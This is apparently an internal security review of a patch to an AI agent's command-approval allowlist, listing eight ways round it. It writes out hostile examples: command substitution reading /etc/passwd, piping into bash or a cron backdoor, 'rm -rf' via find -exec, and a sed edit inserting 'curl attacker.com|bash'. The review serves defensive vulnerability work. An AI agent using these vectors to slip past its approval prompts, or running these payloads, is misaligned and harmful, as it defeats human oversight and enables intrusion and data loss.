# Bypass Analysis: c8b599bd + 44179b7e (Path Traversal in Agent Approval)

**Cluster ID**: agent-approval-path-traversal
**Undisclosed tag**: [undisclosed]

## Patch Summary

Two commits fix path traversal in `x/agent/approval.go`'s hierarchical prefix matching system. When a user approves a command like `cat tools/file.go` with "Allow for this session", the system creates a prefix `cat:tools/` that auto-approves future commands under that directory. The vulnerability allowed `cat tools/../../etc/passwd` to match the `cat:tools/` prefix because the hierarchical matcher checked if the current path started with a stored prefix, and `tools/../../etc/passwd` starts with `tools/`.

- **c8b599bd**: Added `..` rejection and absolute path rejection in `extractBashPrefix`. Custom `normalizePath` function.
- **44179b7e**: Replaced custom normalization with `path.Clean`. Added sibling escape detection (e.g., `tools/a/b/../../../etc` normalizes to `etc`, which has a different base than `tools`).

## Bypass Verdict: **bypassable** (multiple vectors)

## Evidence

### 1. YoloMode completely disables approval (Config-gated)

`x/cmd/run.go:159-160` defines `YoloMode bool` which, when set, skips ALL tool approval prompts (line 400). This is an intentional feature but represents a complete bypass of the entire approval system. Any code path that sets `YoloMode=true` eliminates all protections.

**Severity**: By design, but worth noting as a config-gated complete bypass.

### 2. Non-bash tools bypass path-based approval entirely (Alternate entry points)

The approval system at `x/cmd/run.go:404` calls `approval.IsAllowed(toolName, args)`. For non-bash tools (line 417-419), the check is simply `a.allowlist[toolName]` -- a boolean per tool name. Once a user approves `web_fetch` once with "Allow for this session", ALL subsequent `web_fetch` calls are auto-approved regardless of URL. This means:
- `web_fetch` to `http://internal-service/admin` is approved after any single `web_fetch` approval
- `web_search` queries are similarly blanket-approved

No path or argument validation is performed for non-bash tools.

### 3. Shell metacharacter parser differential (Parser differentials)

`extractBashPrefix` splits on `|` (pipe) and uses `strings.Fields` for word splitting. However, bash interprets many more metacharacters. Bypass examples:

- **Command substitution**: `cat tools/$(cat /etc/passwd)` -- the prefix extractor sees `tools/$(cat` as a path argument, extracts prefix `cat:tools/`, but bash executes the subshell.
- **Semicolons in quoted args**: `cat "tools/file; rm -rf /"` -- `strings.Fields` would split this incorrectly since it doesn't handle shell quoting.
- **Backtick substitution**: `` cat tools/`whoami` `` -- prefix extractor sees a path starting with `tools/`, bash executes the backtick command.
- **Brace expansion**: `cat tools/{a,../../etc/passwd}` -- prefix sees `tools/{a,../../etc/passwd}` as one arg, path.Clean won't resolve the braces, but bash expands them.

The fundamental issue: `extractBashPrefix` performs naive string splitting while the command is passed to `bash -c` which performs full shell interpretation.

### 4. Symlink resolution gap (Default-state gaps)

`path.Clean` performs purely lexical path cleaning. It does NOT resolve symlinks. If an attacker can create a symlink:
```
cat tools/link  (where tools/link -> /etc/passwd)
```
The prefix extractor sees `cat:tools/` and approves it, but the actual read goes through the symlink to an arbitrary location. This is relevant when the agent can create symlinks (via an earlier approved `ln -s` command or via a `bash` tool call).

### 5. Pipe-based bypass of prefix extraction

`extractBashPrefix` only examines the FIRST command in a pipe chain (line 206: `parts := strings.Split(command, "|")`). So:
```
cat tools/safe.go | tee /etc/cron.d/backdoor
```
Gets prefix `cat:tools/` and is auto-approved. The destructive `tee` write is not checked. Similarly:
```
cat tools/safe.go | bash
```
Would be auto-approved if `cat:tools/` is in the allowlist, but executes arbitrary code via the pipe to bash.

Note: The denylist does NOT check pipe targets -- `IsDenied` checks patterns but `tee` is not in the deny list.

### 6. sed is in safeCommands but can write files

`sed` is listed in `safeCommands` (line 222) and benefits from prefix allowlisting. However, `sed -i` performs in-place file editing. Approving `sed 's/foo/bar/' tools/file.go` creates prefix `sed:tools/`, which then auto-approves `sed -i 's/exit 0/curl attacker.com|bash/' tools/deploy.sh`.

### 7. find command injection

`find` is in `safeCommands` but `find` supports `-exec` which runs arbitrary commands:
```
find tools/ -exec rm -rf {} \;
```
Approving any `find tools/...` command creates prefix `find:tools/` which auto-approves destructive `-exec` variants.

### 8. Sibling escape detection is incomplete

The sibling escape check (line 262-268) only triggers when the original arg contains `..`. An attacker who controls directory names could create paths that normalize differently without using `..` at all (e.g., via symlinks as noted above).

## Summary of Bypass Vectors

| # | Vector | Severity | Exploitability |
|---|--------|----------|----------------|
| 1 | YoloMode config flag | Medium | Requires user opt-in |
| 2 | Non-bash tool blanket approval | Medium | Trivial after first approval |
| 3 | Shell metacharacter differential | High | Model-directed command injection |
| 4 | Symlink resolution gap | Medium | Requires prior symlink creation |
| 5 | Pipe target not checked | High | Trivial write/exec via pipe |
| 6 | sed -i in safeCommands | Medium | Trivial after first sed approval |
| 7 | find -exec in safeCommands | High | Trivial after first find approval |
| 8 | Incomplete sibling detection | Low | Requires specific conditions |
